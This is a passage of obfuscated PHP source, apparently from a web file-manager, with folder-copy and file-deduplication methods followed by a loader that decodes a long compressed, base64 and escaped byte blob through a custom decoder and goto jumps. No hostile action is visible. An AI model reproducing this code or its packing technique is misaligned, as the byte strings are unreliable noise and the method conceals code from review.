$¯Ê™¿òğ) { $À¢†¢¨æ =& $_SERVER[ùèÅ´Ãš]; $¯á˜òÀâ = $this->sourceInfo($à®º÷‚Ë); $ËÒãüßÜ = $this->sourceInfo($×°¢¸É¦); $íÑ»ï¦Í = $¯á˜òÀâ[$À¢†¢¨æ[487]] == $À¢†¢¨æ[91]; $“ÉÇÕßµ = array($À¢†¢¨æ[479] => $ËÒãüßÜ[$À¢†¢¨æ[194]], $À¢†¢¨æ[659] => $ËÒãüßÜ[$À¢†¢¨æ[588]] . $ËÒãüßÜ[$À¢†¢¨æ[194]] . $À¢†¢¨æ[50], $À¢†¢¨æ[655] => $ËÒãüßÜ[$À¢†¢¨æ[191]], $À¢†¢¨æ[656] => $ËÒãüßÜ[$À¢†¢¨æ[573]], $À¢†¢¨æ[658] => USER_ID, $À¢†¢¨æ[496] => $¯Ê™¿òğ); $ıº™ÓØ¾ = $¯á˜òÀâ[$À¢†¢¨æ[191]] == SourceModel::TYPE_GROUP && $ËÒãüßÜ[$À¢†¢¨æ[191]] == SourceModel::TYPE_GROUP && $¯á˜òÀâ[$À¢†¢¨æ[573]] == $ËÒãüßÜ[$À¢†¢¨æ[573]]; if (!$ıº™ÓØ¾ && $this->moveClearAuth) { Model($À¢†¢¨æ[571])->authClear($à®º÷‚Ë); } $ÈÕ…÷¦¹ = $¯á˜òÀâ[$À¢†¢¨æ[507]] == $À¢†¢¨æ[91] && $ËÒãüßÜ[$À¢†¢¨æ[507]] != $À¢†¢¨æ[91]; if ($ÈÕ…÷¦¹) { $“ÉÇÕßµ[$À¢†¢¨æ[506]] = 0; } if ($íÑ»ï¦Í) { $ÖÑ°¥˜Ã = array($À¢†¢¨æ[659] => array($À¢†¢¨æ[619], $¯á˜òÀâ[$À¢†¢¨æ[588]] . $¯á˜òÀâ[$À¢†¢¨æ[194]] . $À¢†¢¨æ[620])); $…Åô²×§ = $¯á˜òÀâ[$À¢†¢¨æ[588]] . $¯á˜òÀâ[$À¢†¢¨æ[194]] . $À¢†¢¨æ[50]; $Õ¸“Â½ = $ËÒãüßÜ[$À¢†¢¨æ[588]] . $ËÒãüßÜ[$À¢†¢¨æ[194]] . $À¢†¢¨æ[50] . $¯á˜òÀâ[$À¢†¢¨æ[194]] . $À¢†¢¨æ[50]; $ÏºŸ¡êè = array($À¢†¢¨æ[659] => array($À¢†¢¨æ[668], "\162\145\x70\154\x61\x63\145\50\x70\141\x72\x65\156\x74\x4c\145\x76\145\x6c\54\47{$…Åô²×§}\47\x2c\x27{$Õ¸“Â½}\47\51"), $À¢†¢¨æ[655] => $ËÒãüßÜ[$À¢†¢¨æ[191]], $À¢†¢¨æ[656] => $ËÒãüßÜ[$À¢†¢¨æ[573]]); if ($ÈÕ…÷¦¹) { $ÏºŸ¡êè[$À¢†¢¨æ[506]] = 0; } $this->where($ÖÑ°¥˜Ã)->data($ÏºŸ¡êè)->save(); } $this->where(array($À¢†¢¨æ[493] => $à®º÷‚Ë))->data($“ÉÇÕßµ)->save(); return $à®º÷‚Ë; } private function clearShare($£Î£ÕÚˆ, $–œ©œë¹) { $òÎá¨Âå =& $_SERVER[ùèÅ´Ãš]; $®‰ï³Ê° = $this->sourceInfo($£Î£ÕÚˆ); $¢ØĞ÷æ· = $this->sourceInfo($–œ©œë¹); if ($®‰ï³Ê°[$òÎá¨Âå[573]] == $¢ØĞ÷æ·[$òÎá¨Âå[573]] && $®‰ï³Ê°[$òÎá¨Âå[191]] == $òÎá¨Âå[669]) { return; } $ï±Õû = array($òÎá¨Âå[588] => array($òÎá¨Âå[619], $®‰ï³Ê°[$òÎá¨Âå[588]] . $£Î£ÕÚˆ . $òÎá¨Âå[620])); $Ç¨‚× = $this->field($òÎá¨Âå[493])->where($ï±Õû)->getField($òÎá¨Âå[194], !0); if (!$Ç¨‚×) { return; } $ï±Õû = array($òÎá¨Âå[194] => array($òÎá¨Âå[7], $Ç¨‚×), $òÎá¨Âå[670] => 1); $è‰ƒøıà = Model($òÎá¨Âå[671])->field($òÎá¨Âå[672])->where($ï±Õû)->select(); if (!$è‰ƒøıà) { return; } $è‰ƒøıà = array_to_keyvalue($è‰ƒøıà, $òÎá¨Âå[12], $òÎá¨Âå[672]); $ï±Õû = array($òÎá¨Âå[672] => array($òÎá¨Âå[7], $è‰ƒøıà)); Model($òÎá¨Âå[671])->where($ï±Õû)->save(array($òÎá¨Âå[670] => 0)); Model($òÎá¨Âå[673])->where($ï±Õû)->delete(); } public function copyFolderFromIO($ıÜ¨„Àî, $³êª™‘Å, $­…äİ¬ß, $™¬†¯ô´, $ÚİÊ—ŞÏ, $¹åçîø = false) { $šë”ıŸ³ =& $_SERVER[ùèÅ´Ãš]; $ÅçË­ÒÚ = array($šë”ıŸ³[637] => array(), $šë”ıŸ³[638] => array(), $šë”ıŸ³[636] => array(), $šë”ıŸ³[674] => array()); $Øœ÷ïß = $¹åçîø ? $¹åçîø : $ıÜ¨„Àî->pathThis($³êª™‘Å); $Ÿ‹¼‘ÉÇ = $this->fileNameExist($­…äİ¬ß, $Øœ÷ïß); $ğ ºßô… = $this->mkdir($­…äİ¬ß, $Øœ÷ïß, $™¬†¯ô´); if (!$Ÿ‹¼‘ÉÇ || $™¬†¯ô´ == REPEAT_RENAME_FOLDER) { $™¬†¯ô´ = !1; } if ($Ÿ‹¼‘ÉÇ) { $this->_childrenAllMake($Ÿ‹¼‘ÉÇ); } Hook::trigger($šë”ıŸ³[675]); $…‹ıÁÌø = KodIO::ioFileDriverGet($šë”ıŸ³[485] . $­…äİ¬ß . $šë”ıŸ³[404]); $this->_copyChildTo($ıÜ¨„Àî, $³êª™‘Å, $ğ ºßô…, $™¬†¯ô´, $ÅçË­ÒÚ, $ÚİÊ—ŞÏ, $…‹ıÁÌø); Hook::trigger($šë”ıŸ³[676]); if ($ğ ºßô…) { $this->folderSizeResetChildren($ğ ºßô…); } $this->_childrenListClear(); Model($šë”ıŸ³[639])->addAll($ÅçË­ÒÚ[$šë”ıŸ³[637]], array(), !0); Model($šë”ıŸ³[640])->eventCopy($ğ ºßô…); $this->saveAll($ÅçË­ÒÚ[$šë”ıŸ³[638]]); Model($šë”ıŸ³[548])->linkAdd($ÅçË­ÒÚ[$šë”ıŸ³[636]]); Model($šë”ıŸ³[548])->remove($ÅçË­ÒÚ[$šë”ıŸ³[674]]); $this->folderSizeReset($­…äİ¬ß); $this->updateModifyTime($­…äİ¬ß); return $ğ ºßô…; } private function _copyChildTo($ÃéìãÒ, $šë¬ŞÔÃ, $Ò² âˆ›, $‹­¥ïç·, &$³çò±µë, $ğ¤­¾æÂ, $ß€â‰²) { $‘¹éúŸ =& $_SERVER[ùèÅ´Ãš]; $½î¶“Ïå = $this->sourceInfoCache($Ò² âˆ›); $‰Ï³™»º = $ÃéìãÒ->listPath($šë¬ŞÔÃ); $‰Ï³™»º = $‰Ï³™»º ? $‰Ï³™»º : array($‘¹éúŸ[86] => array(), $‘¹éúŸ[85] => array()); $Å¬—™±ğ = array_merge($‰Ï³™»º[$‘¹éúŸ[86]], $‰Ï³™»º[$‘¹éúŸ[85]]); $Èü×äØ = $this->_addFiles($ÃéìãÒ, $ß€â‰², $‰Ï³™»º[$‘¹éúŸ[86]], $ğ¤­¾æÂ); $»Ôİäı = array(); foreach ($Å¬—™±ğ as &$°ÌŸ£¤ä) { if (isset($Èü×äØ[$°ÌŸ£¤ä[$‘¹éúŸ[32]]])) { $°ÌŸ£¤ä = $Èü×äØ[$°ÌŸ£¤ä[$‘¹éúŸ[32]]]; } $°ÌŸ£¤ä[$‘¹éúŸ[487]] = $°ÌŸ£¤ä[$‘¹éúŸ[33]] == $‘¹éúŸ[78]; $°ÌŸ£¤ä[$‘¹éúŸ[488]] = substr(_get($°ÌŸ£¤ä, $‘¹éúŸ[169], $‘¹éúŸ[12]), 0, 10); $°ÌŸ£¤ä[$‘¹éúŸ[79]] = _get($°ÌŸ£¤ä, $‘¹éúŸ[79], 0); $°ÌŸ£¤ä[$‘¹éúŸ[545]] = _get($°ÌŸ£¤ä, $‘¹éúŸ[545], 0); if (!isset($°ÌŸ£¤ä[$‘¹éúŸ[677]]) && $°ÌŸ£¤ä[$‘¹éúŸ[545]]) { $³çò±µë[$‘¹éúŸ[674]][] = $°ÌŸ£¤ä[$‘¹éúŸ[545]]; } if ($‹­¥ïç·) { $®Œ¥…Öš = $this->fileNameExistCache($Ò² âˆ›, $°ÌŸ£¤ä[$‘¹éúŸ[32]]); if ($®Œ¥…Öš) { if ($°ÌŸ£¤ä[$‘¹éúŸ[487]] || $‹­¥ïç· == REPEAT_SKIP) { continue; } if ($‹­¥ïç· == REPEAT_REPLACE) { $ÃÄù¥–ç = $this->sourceInfoCache($®Œ¥…Öš); $›¸¦œ¤ = $this->fileHistory($ÃÄù¥–ç, $°ÌŸ£¤ä[$‘¹éúŸ[545]], $°ÌŸ£¤ä[$‘¹éúŸ[79]]); if ($›¸¦œ¤) { $³çò±µë[$‘¹éúŸ[636]][] = $°ÌŸ£¤ä[$‘¹éúŸ[545]]; } continue; } else { if ($‹­¥ïç· == REPEAT_RENAME) { $°ÌŸ£¤ä[$‘¹éúŸ[32]] = $this->fileNameAutoCache($Ò² âˆ›, $°ÌŸ£¤ä[$‘¹éúŸ[32]], $‹­¥ïç·, !1); } } } } if (!$°ÌŸ£¤ä[$‘¹éúŸ[487]] && $°ÌŸ£¤ä[$‘¹éúŸ[545]] == 0) { continue; } if (!$°ÌŸ£¤ä[$‘¹éúŸ[487]] && $°ÌŸ£¤ä[$‘¹éúŸ[545]]) { $³çò±µë[$‘¹éúŸ[636]][] = $°ÌŸ£¤ä[$‘¹éúŸ[545]]; } $»Ôİäı[] = $this->_makeItemData($°ÌŸ£¤ä, $½î¶“Ïå, $°ÌŸ£¤ä[$‘¹éúŸ[32]]); } unset($°ÌŸ£¤ä); if (!empty($»Ôİäı)) { $this->addAll($»Ôİäı); $this->_childrenListSelect($Ò² âˆ›); } $Å»Ÿ´¿Í = $this->_childrenList($Ò² âˆ›); $Å»Ÿ´¿Í = array_to_keyvalue($Å»Ÿ´¿Í, $‘¹éúŸ[32]); foreach ($Å¬—™±ğ as $°ÌŸ£¤ä) { $ÃÄù¥–ç = $Å»Ÿ´¿Í[$°ÌŸ£¤ä[$‘¹éúŸ[32]]]; $î·‘öç = $ÃÄù¥–ç[$‘¹éúŸ[194]]; $this->_copyApplyMeta($ÃÄù¥–ç, $³çò±µë); if ($°ÌŸ£¤ä[$‘¹éúŸ[33]] == $‘¹éúŸ[78]) { $°ÌŸ£¤ä[$‘¹éúŸ[87]] = $ÃéìãÒ->getPathInner($°ÌŸ£¤ä[$‘¹éúŸ[87]]); $this->_copyChildTo($ÃéìãÒ, $°ÌŸ£¤ä[$‘¹éúŸ[87]], $î·‘öç, $‹­¥ïç·, $³çò±µë, $ğ¤­¾æÂ, $ß€â‰²); } } } private function _addFiles($ÖÕüòş, $ùºİŞÒÇ, $å²ï¨ßÆ, $ñèÀçí£) { $¥ÊâæŠ =& $_SERVER[ùèÅ´Ãš]; if (!$å²ï¨ßÆ || count($å²ï¨ßÆ) == 0) { return array(); } $¶ş„Óß = array(); foreach ($å²ï¨ßÆ as &$˜úàİ¦) { Hook::trigger($¥ÊâæŠ[678], $˜úàİ¦); $˜úàİ¦[$¥ÊâæŠ[87]] = $ÖÕüòş->getPathInner($˜úàİ¦[$¥ÊâæŠ[87]]); $„€û…üæ = $ÖÕüòş->hashSimple($˜úàİ¦[$¥ÊâæŠ[87]]); $ÙšÆÁúœ = $ÖÕüòş->hashMd5($˜úàİ¦[$¥ÊâæŠ[87]]); if (strlen($ÙšÆÁúœ) > 10 && !isset($¶ş„Óß[$ÙšÆÁúœ])) { $¶ş„Óß[$ÙšÆÁúœ] = array(); } $˜úàİ¦[$¥ÊâæŠ[679]] = $„€û…üæ; $˜úàİ¦[$¥ÊâæŠ[551]] = $ÙšÆÁúœ; $¶ş„Óß[$ÙšÆÁúœ][] =& $˜úàİ¦; if (count($¶ş„Óß[$ÙšÆÁúœ]) > 1) { $˜úàİ¦[$¥ÊâæŠ[677]] = !0; } Hook::trigger($¥ÊâæŠ[680], $˜úàİ¦); } unset($˜úàİ¦); $»Áá½¿‹ = array($¥ÊâæŠ[551] => array($¥ÊâæŠ[7], array_keys($¶ş„Óß))); $„ÃÍ–¹™ = Model($¥ÊâæŠ[681]); $ìËèˆ©¢ = $„ÃÍ–¹™->where($»Áá½¿‹)->select(); $ìËèˆ©¢ = $ìËèˆ©¢ ? $ìËèˆ©¢ : array(); foreach ($ìËèˆ©¢ as $¬ÔÀäªÆ) { if (!isset($¶ş„Óß[$¬ÔÀäªÆ[$¥ÊâæŠ[551]]])) { continue; } $ÊŞÏöÇÏ = $¶ş„Óß[$¬ÔÀäªÆ[$¥ÊâæŠ[551]]]; foreach ($ÊŞÏöÇÏ as &$˜úàİ¦) { $˜úàİ¦[$¥ÊâæŠ[545]] = $¬ÔÀäªÆ[$¥ÊâæŠ[545]]; $˜úàİ¦[$¥ÊâæŠ[677]] = !0; } unset($˜úàİ¦); } $½†ÊØÚ = array(); foreach ($å²ï¨ßÆ as $‡æûë«¡) { Hook::trigger($¥ÊâæŠ[682], $‡æûë«¡); if (isset($‡æûë«¡[$¥ÊâæŠ[677]]) && $‡æûë«¡[$¥ÊâæŠ[677]]) { Hook::trigger($¥ÊâæŠ[683], $‡æûë«¡); continue; } $“«İª°ñ = $ÖÕüòş->getPathInner($‡æûë«¡[$¥ÊâæŠ[87]]); $¯ä‰ÌöĞ = $„ÃÍ–¹™->addFileMake($“«İª°ñ, $ùºİŞÒÇ, $‡æûë«¡[$¥ÊâæŠ[79]], $‡æûë«¡[$¥ÊâæŠ[679]], $‡æûë«¡[$¥ÊâæŠ[551]], $‡æûë«¡[$¥ÊâæŠ[32]], $ñèÀçí£); Hook::trigger($¥ÊâæŠ[683], $‡æûë«¡); if (!is_array($¯ä‰ÌöĞ)) { continue; } $½†ÊØÚ[] = $¯ä‰ÌöĞ; } $„ÃÍ–¹™->addAll($½†ÊØÚ); $»Áá½¿‹ = array($¥ÊâæŠ[551] => array($¥ÊâæŠ[7], array_keys($¶ş„Óß))); $ìËèˆ©¢ = $„ÃÍ–¹™->where($»Áá½¿‹)->select(); $ìËèˆ©¢ = $ìËèˆ©¢ ? $ìËèˆ©¢ : array(); foreach ($ìËèˆ©¢ as $¬ÔÀäªÆ) { if (!isset($¶ş„Óß[$¬ÔÀäªÆ[$¥ÊâæŠ[551]]])) { continue; } $İó¨ ±¤ =& $¶ş„Óß[$¬ÔÀäªÆ[$¥ÊâæŠ[551]]]; foreach ($İó¨ ±¤ as &$˜úàİ¦) { $˜úàİ¦[$¥ÊâæŠ[545]] = $¬ÔÀäªÆ[$¥ÊâæŠ[545]]; } unset($˜úàİ¦); } $ÈüÑïÖ = array(); foreach ($å²ï¨ßÆ as $Ñ‚ü‹‡ê) { $ÈüÑïÖ[$Ñ‚ü‹‡ê[$¥ÊâæŠ[32]]] = $Ñ‚ü‹‡ê; } return $ÈüÑïÖ; } } define($_SERVER[ùèÅ´Ãš][684], $_SERVER[ùèÅ´Ãš][685]); $rtsypgevbj = $_SERVER[ùèÅ´Ãš][686]; goto EÏá·æ¿Î²; fğÆÆ…Ø¢: define($_SERVER[ùèÅ´Ãš][0], $_SERVER[ùèÅ´Ãš][1]); $_SERVER[Ş’›çØ] = explode($_SERVER[ùèÅ´Ãš][2], gzinflate(substr($_SERVER[ùèÅ´Ãš][3], 10, -8))); function binCheckEq($ö·–€‰×, $¯çĞÚ­í) { return $ö·–€‰× == $¯çĞÚ­í; } goto CÒšø¹—°; bÑ§“ÚÆƒ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\371\350\305\264\303\232", "\xa7\x8e\x9c\x9e\xa7\xf5"); $_SERVER[ùèÅ´Ãš] = explode("\x7c\x4\x7c\x1\x7c\x3", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\x7d\x9\x78\x1b\xd5\xb5\x30\x5\xca\x5a\xe0\xd1\x2\x4d\x5b\x1e\x4c\xc\xc1\x4b\xb4\xd8\xd9\xe3\xc4\x9\xb2\x2c\xdb\x22\xb2\xe5\x48\x72\x56\x27\x93\xb1\x34\x92\x27\x96"."\64\262\146\344\55\11\145\111\130\12\11\153\131\302\126\240\145\151\33\302\26\10\201\0\135\200\276\26\150\51\274\26\312\16\261\223\24\132\12\155\51\55\5\376\273\234\273\314\110\206\367\177\357"."\377\276\77\220\350\56\347\336\271\313\271\347\236\173\356\71\347\276\166\343\345\327\355\175\161\375\301\353\277\264\376\240\35\277\332\364\314\266\333\151\30\375\173\60\371\27\205\117\276\350\260\3\310"."\x9f\xaf\x5d\xf4\x9d\x9a\x9a\xf6\x59\x47\x4c\xed\xfc\xca\x25\xf7\x6f\xd3\xbe\xd4\x3c\xfe\xd1\xcf\xef\x7f\xfa\xfa\x17\xde\x78\xfa\x87\x89\xd4\x82\x5d\xd7\x67\x4e\x3a\xe0\xc0\xd7\x9b\x3e\x68\x44\xa0\xb4\x64\x23\xfd"."\121\362\246\255\350\303\206\145\133\64\41\151\346\323\106\206\206\215\74\375\365\323\237\356\130\244\250\347\114\133\247\121\37\375\121\171\253\320\277\326\100\326\140\371\152\147\64\241\306\273\273\272\102"."\261\4\0\65\312\371\71\63\5\241\202\126\324\162\360\375\202\136\264\120\153\344\352\324\202\131\320\363\216\24\221\220\322\154\255\127\263\240\246\226\146\265\45\324\25\211\56\127\23\313\273\102\0"."\321\253\16\224\364\342\10\215\221\140\334\326\212\166\302\310\351\34\142\250\310\333\325\34\152\13\167\52\211\130\240\63\36\10\46\302\321\116\232\34\214\166\164\204\23\345\351\261\150\44\322\34\10".base64_decode('LirP6YoF2joCCmpfVleNfNqsUdbQnDVKLQ20Gno2RYN5jTXHHilAKMFDaJrypWyWRjp5KKU=')."\247\265\122\26\106\253\105\216\24\212\106\116\143\235\136\244\217\360\124\32\320\112\266\151\344\223\64\22\32\266\213\232\110\107\155\115\242\211\326\363\120\125\74\24\11\5\23\12\156\240\322\32\213".base64_decode('digwCTnNsvWisrQ9FAspuNFN1aSv1QrgSycaCiUQiSgT1WDruQKrhpapUFk01hKKKc3LFTE=')."\x42\x49\x33\x97\x33\xf3\x3e\x54\xb\x9a\x49\x5b\x6a\x6a\x28\x16\xa3\x1\xf\xa0\x77\x24\x8c\x27\xd\x22\xd1\xd6\xd6\x78\x88\xc7\xa0\x73\x8b\x23\xa8\x25\xd3\x1\x3f\x1d\xb1\x54\x3a\x6b\xab\x83\x5a\xb6\xc4\xd0\xb4".base64_decode('n/5Www/8mhag7oCRN0qAplCFafJlBYESg9ZZip6CQA6VN6FcL6T1Mqi1LGCgFTpIg00L6O8=')."\x3c\x28\xdf\xab\xe2\x3c\xbd\x68\xab\x7a\x3e\x69\xa6\x8c\x3c\xac\xe3\x85\x80\x8f\x9a\xdd\xd7\x52\x34\x10\x0\x8d\xa7\xcd\x6c\x8a\x85\x2d\x63\x14\x7a\x99\x36\xb2\x7a\x67\x29\x27\x83\xf0\x68\xb2\xcf\xc8\xa6\x8a\x6c"."\xe9\x7d\x1e\x24\x8d\x46\xf8\x4a\xc6\xb0\x22\x56\x40\x2d\xe1\x44\xc0\x48\x8f\x88\xa5\x88\xe1\xba\x78\xae\x65\x96\x8a\x49\x3d\x8c\x96\xe\x8d\x37\x40\xb2\x6e\xdb\xa8\x73\x6c\x40\xcc\xee\x42\xd6\xd4\x52\x71\xbd\xc8"."\xbb\x66\x98\xad\xa8\xa2\x68\xc9\x96\x13\x4b\x4\xac\xd5\x2c\xe6\x5a\x10\xd1\x90\xd3\x3a\xd0\xb2\x31\x44\x62\x3f\x5b\x2e\x29\x69\xb4\xfc\x35\x2b\xcf\xf6\x7e\xba\x6a\xe5\xe9\xe8\x9f\x5a\xa0\x88\x3d\xd0\x9e\x3e\x3d".base64_decode('m1X1YR3WUy4102ID4bd6jbwfpdBoOKr2aVZfR2qmSkoxQpvSh32FvgIsdr6+exz4joet07Q=').strrev('ñf;Ö!å—0V-4oi\\²‡JRQâÔ'."\0".'ë ©FO(sĞ'."\n".'<)ó×»lû†…w+-IšÎ¹C')."\x44\x7b\x98\x4d\x65\x2a\xd\x98\xca\x76\x8b\x2a\xf8\xa0\x61\x11\xc2\x27\x56\xad\x56\x28\x64\x8d\xa4\x66\x1b\x66\xde\x6f\x26\x6d\xdd\xf6\x5a\x76\x51\xd7\xa0\xc6\x40\x32\xa9\x5b\x96\x37\x68\xe6\xed\xa2\x99\xf5\x6".base64_decode('sllzyBstGhkj36jUAQ1GmWitezFdbIQFXDVPwUiDP1PXVLLT3jlsYXLoopa30nrRG4JV0ag=')."\xa0\xc6\x72\xe2\xc8\xc0\x5a\xc\xab\x60\x5a\x6\x6e\x5e\xa3\xa2\xd9\xb6\x96\xec\xc3\x84\x45\x54\xdf\xf4\x39\xf0\x46\x3e\x6b\xe4\xf5\x72\x58\x54\x89\xee\xed\x2a\x6a\x99\x9c\xd6\xa8\x14\x4a\xbd\x68\x0\x60\x31\x42"._kodDe('LgJKuDMgsH3wPjrmCwlaQ0aoWARQe2VK5dtZ8DiVNg2tAWhqCQu6hDcaC06LMy+oMaCSiizK')."\236\110\164\251\341\126\264\65\167\206\324\216\100\42\330\16\265\333\132\206\125\35\101\364\230\127\311\22\227\171\321\142\302\330\324\211\72\47\22\273\314\41\275\210\76\334\74\322\250\364\233\251\136"."\163\330\307\262\60\160\34\121\25\6\214\347\267\140\173\143\132\76\203\273\321\73\142\353\226\233\56\65\243\215\334\227\246\53\327\327\253\247\315\42\364\306\32\314\70\7\77\242\347\63\166\37\253"."\73\36\212\55\11\305\324\170\264\65\261\64\20\203\175\77\217\60\147\230\265\6\177\75\353\215\351\51\64\210\111\233\225\323\12\142\364\227\171\361\202\301\37\147\271\170\21\261\274\110\270\15\217".base64_decode('XYvXQkBeGYrVHTFyBu6ezXPIYCOmoA0a5Cd9buqx6mp6UlNrvejfutqVPS2+ulUL/YYo428=').base64_decode('8DUo0+pnKV2ISzG0rAKdLoOoV6KLnMMiMDxv5vWKCwshkmnp3nZdQwQaTYRjXjzsWzT+OaM=')."\213\367\111\211\226\270\346\205\46\306\102\213\273\103\361\204\332\21\112\264\107\133\240\371\241\0\204\362\250\60\151\57\233\143\314\224\301\226\230\207\152\365\141\151\377\20\373\100\122\36\20\122\256"."\xd3\x1c\x62\x94\xdf\x85\x40\xc1\x3e\x3d\xd9\x3f\x41\x1e\xa\x41\x6f\x4c\x4a\x97\xd8\xd4\xad\xa4\x3f\xab\x0\x9b\x57\xd1\x1f\x55\xd\x46\x42\x81\x98\xa\xdc\xac\x6a\x58\xad\xd2\x16\x8a\xa3\x9c\xdc\xaa\x66\xef\x5a"."\x84\x68\x1d\x3a\xdb\x53\xe0\xc3\xe1\x1c\x5a\xd2\xa2\x23\xaa\x73\xbf\x63\xbd\xec\x10\x88\x8f\x56\xd0\x52\x23\xc5\x37\x44\x14\x6d\xd7\x8d\x4c\x1f\xb4\xdb\xc0\xd5\x25\xcd\xac\x59\xd4\xb2\x78\x2b\x60\x3c\x6c\xc6\x0"."\252\134\310\226\320\62\360\343\212\23\175\245\134\57\154\134\150\310\62\272\55\330\113\153\4\361\140\71\266\71\243\35\336\16\267\70\266\140\210\371\125\214\272\75\276\102\76\123\173\52\324\245\116".strrev('7É Î¤%Påõ•³À™7&¼·‡œı"Ê’<Ûˆ÷½~´;Î´M%÷]åé.Ïˆg¡V`Y›')."\x69\x7a\x92\x99\xe7\xdc\xf2\x14\xbd\x58\x34\x8b\x93\x1\x82\x84\x15\xb2\x6f\xe2\xe9\x82\xca\x6d\xce\x81\x58\x88\x22\xb0\x70\x9f\xc9\x39\x16\x93\xe1\x66\xa3\x1f\xfa\x3d\x65\x5a\x2b\x50\x91\x14\xe2\xdc\x7c\x96\x8d"."\46\1\165\120\113\245\52\45\43\312\3\25\254\147\150\113\62\30\133\340\217\117\107\377\13\36\40\145\346\64\266\243\142\102\304\77\213\43\26\217\221\155\122\117\321\175\322\221\104\27\70\115\252"."\x63\x9f\x2c\xda\x26\xce\x2c\x3a\x20\x11\x92\xf6\x99\xd0\x68\x84\x15\xd0\xe1\x12\xef\x39\x1b\x83\x94\x9e\xd5\x19\x82\xf5\xe9\x8c\xd5\xa8\x7\x30\x34\x33\x1c\xfd\xd2\x7c\x1d\xa0\x83\x4\x4a\x15\xfc\x9d\x61\xc5\x50"."\111\314\30\260\370\122\174\362\22\11\230\73\2\274\22\301\54\232\325\50\131\120\42\336\125\324\323\306\60\43\45\303\166\207\126\354\147\35\103\45\305\122\304\21\151\231\266\166\107\42\152\60\332"."\231\100\7\67\232\262\64\26\116\204\30\305\12\264\250\201\140\27\304\4\15\344\14\234\314\202\320\224\301\151\200\102\250\21\176\301\53\241\315\272\140\346\21\245\5\142\345\25\307\272\262\254\224"."\x60\x25\x0\x77\x4\xfb\xe1\xe2\x28\x10\x4f\x90\x1b\xf5\xe6\x10\x5d\xf1\xf2\x36\x75\x75\x3\x2f\xc0\xb0\x82\xb1\xc4\xcd\x23\x98\xdb\x65\xa4\x23\x93\x5f\xc2\x67\x7e\x69\x7c\x86\xb7\xbd\x23\x10\xf4\xc6\xdb\x3\xd3".base64_decode('Zs6iqctzqZ5Eu2H1rOBxaM6QNUMt6mhNM1yYVt/AVhziSzTR8uXenBfXgllKX319Patr6iw=').strrev('.0b*ÀB%’í…EN®$µSwdJ·ÁòÔüvr§y£C¼·92ëöJS”ì·¤S¿N‘¥').base64_decode('maZq2YyJ8K4vJyemOP7SuE5ZLvhQn8bHCY8eWxyIoRuRC+FhRm1g9NvJYyuJygNNWfcwjLY=')."\150\107\1\357\154\210\152\263\151\73\215\376\34\1\315\50\241\165\133\64\106\245\321\137\310\152\142\64\63\32\207\117\16\347\262\342\374\5\103\3\243\51\167\155\130\105\71\52\344\250\162\116\73".base64_decode('pwNsFjpaXGuCbv40bf5C9EVlEEtzzHxTdYOvvlphp9Km6u5EK+LTFy44Yn7QzBUwWSFHMNw=').base64_decode('X4q5C6CP8zEPxCJdruEIJTTYdeb7Zbj5/olqha5gxmyZ2hUJJFqjsQ7A8UJBoFUhWWm1eQU=')."\105\52\131\136\35\363\311\260\12\264\144\326\205\242\362\130\54\253\210\211\313\52\141\342\62\27\46\56\53\307\304\145\225\360\154\20\20\122\313\151\243\146\36\255\127\264\321\346\174\111\100\213\104"."\173\270\163\221\332\21\155\11\105\324\160\47\342\347\22\345\351\335\135\55\1\106\6\345\364\346\150\242\335\221\332\215\70\272\45\201\110\330\15\36\132\26\216\47\342\25\263\120\132\167\310\225\323".strrev('‚¨ß“*\\¤9ˆ8@TÜ‹œi¬E^¿,¦ÏI^ ˆ0l0jâZEÚ<eá­BÅv¬Ò')."\243\143\216\16\323\1\335\305\102\113\322\23\225\221\252\22\147\64\331\231\76\307\266\132\164\104\203\141\147\347\223\32\372\123\253\4\342\212\135\120\371\246\332\73\302\203\244\33\54\216\270\20\370".base64_decode('vgJsclkLVAzTLB2GKicE0jbnRF1xtIWIPDQDASIdRZhAZgQ+Y6ANqWgHWHPSQjKpRrtCsQA=')."\x96\x6b\xaa\x4b\x63\xd1\xce\x36\x28\x30\xd4\xa7\xb3\x6\x84\x61\xf8\x6b\xd8\xe9\x14\xc4\x9b\xb6\xd8\xd7\xb5\xac\xa1\x31\x39\x97\x18\xf4\xb5\x26\x1b\x4a\x74\x22\x67\x3c\x7f\x9e\x8d\x73\x2f\x66\x6a\x18\xa7\xcb\x2"."\151\264\220\31\103\142\226\170\375\275\246\11\165\146\361\101\14\252\267\30\52\14\263\155\171\52\337\266\0\101\243\213\102\235\52\303\37\32\223\160\216\46\204\142\261\150\14\272\155\233\375\114\0"."\x46\x33\x63\xa1\x78\x28\xc1\x36\xf6\x81\x92\xc1\x6\xc5\xef\x9b\xa\xb8\xaa\x23\x56\xe\x3e\xef\x5f\xdd\x33\x34\xb5\x66\xa5\x77\xaa\x6f\x15\xa\xd4\xd6\x9d\x4e\xa3\x10\xeb\xf1\x39\xa2\x8c\xc3\x2e\x15\x79\x69\xcc"."\xfd\xd5\x58\xb\x6b\x1b\x7b\xfc\x3d\xfe\x9a\x85\x8d\x2b\x3\xde\x51\xcd\x3b\x5a\xef\x9d\xeb\x5d\x85\xf8\xf2\xda\xa9\x90\xb0\x6a\xdd\x34\xcf\x8c\xd\x18\x0\x1\x2e\x3c\x65\x15\xfa\x69\xea\x59\x38\xa5\xc7\x7b\xda"."\x99\x6b\x4e\x5f\xd9\xb3\xaa\xba\x71\xea\xe4\x1e\xdf\x29\x3d\x43\xab\xea\x6a\x17\xb2\xef\x24\x4b\x45\xc4\xfa\xb3\xfd\xc\x35\x35\x35\xb5\x6\x35\x9\x9d\x55\x39\x48\x5e\x22\xbf\x4\x80\x65\x8c\x1a\x5\x91\xba\x6e"."\326\6\226\216\346\115\317\210\22\53\275\75\123\127\55\224\312\111\111\356\157\41\12\212\30\275\76\16\27\360\256\300\75\343\105\361\352\6\234\50\345\223\142\23\304\330\337\253\361\103\137\46\57"."\116\123\166\221\13\105\7\21\106\12\72\273\156\12\375\335\300\46\62\243\17\63\2\220\117\33\214\211\52\345\215\1\166\254\311\353\3\20\60\155\216\305\272\75\244\63\364\100\351\216\70\102\16"."\x46\xfb\x51\x96\x14\xcb\x4a\x7b\x5\x91\x60\x71\x1c\xe5\xc8\x64\x1